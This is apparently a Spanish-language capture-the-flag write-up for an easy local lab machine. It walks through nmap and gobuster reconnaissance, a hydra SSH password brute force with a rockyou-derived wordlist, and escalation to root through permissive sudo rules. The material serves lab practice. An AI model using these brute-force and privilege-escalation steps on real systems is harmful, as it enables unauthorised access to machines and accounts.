tags: #muy-facil #hydra #ftp
_______________________________
Comenzamos con un escaneo básico de puertos:

```bash
nmap -sS -p- 172.17.0.2 -n -Pn -vvv --open --min-rate 2000 -oN ports
```

![[Anexos/Pasted image 20251008180930.png]]

Ahora, lanzamos un escaneo básico de versión del servicio y enviar unos scripts básicos de reconocimiento:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN versions
```

![[Anexos/Pasted image 20251008181050.png]]

De momento, nos llama la atención que tenemos un servicio web y un servicio ssh corriendo, así que vamos a lanzar unos scripts con nmap para detectar vulnerabilidades:

```bash
nmap --script vuln 172.17.0.2 -vvv -oN vuln
```

![[Anexos/Pasted image 20251008181203.png]]

No vemos nada interesante, así que vamos a echarle un vistazo al servicio web:

![[Anexos/Pasted image 20251008181245.png]]

En principio, no vemos nada, así que vamos a ir un poco más allá haciendo fuzzing con gobuster:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.xml,.txt,.html -t 10 -o dirs.txt
```

![[Anexos/Pasted image 20251008181553.png]]

Primero, como pista, la contraseña se encuentra en el rockyou, pero el las últimas 100 líneas, así que ejecutamos el siguiente comando para crear un archivo dic.txt con las últimas 100 líneas del rockyou, y eliminando el espacio que sobra.

```bash
Tail -100 /usr/share/wordlists/rockyou.txt | sed 's/ //g' > dic.txt
```

Ahora ejecutamos el comando de hydra con nuestro diccionario:

```bash
hydra -l tails  -P ./dic.txt ssh://172.17.0.2 -I
```

![[Anexos/Pasted image 20251008185009.png]]

Nos encuentra la contraseña **3117548331**

Entramos por ssh con el usuario tails:

```bash
ssh tails@172.17.0.2
```

![[Anexos/Pasted image 20251008185248.png]]

Ahora, estamos como tails:

![[Anexos/Pasted image 20251008185308.png]]

Con el comando **sudo -l** comprobamos que podemos ejecutar todos los comandos sin contraseña para el usuario sonic, así que probamos ejecutar una bash con el usuario sonic, con éxito:

![[Pasted image 20251008185707.png]]

![[Pasted image 20251008185945.png]]

Ahora, volvemos a comprobar con sudo -l los permisos:

![[Pasted image 20251008190022.png]]

Vemos que podemos ejecutar todos los comandos para todos los usuarios, sin contraseña, así que ejecutamos el siguiente comando:

```bash
sudo su
```

Y.... root!!

![[Anexos/Pasted image 20251008190117.png]]




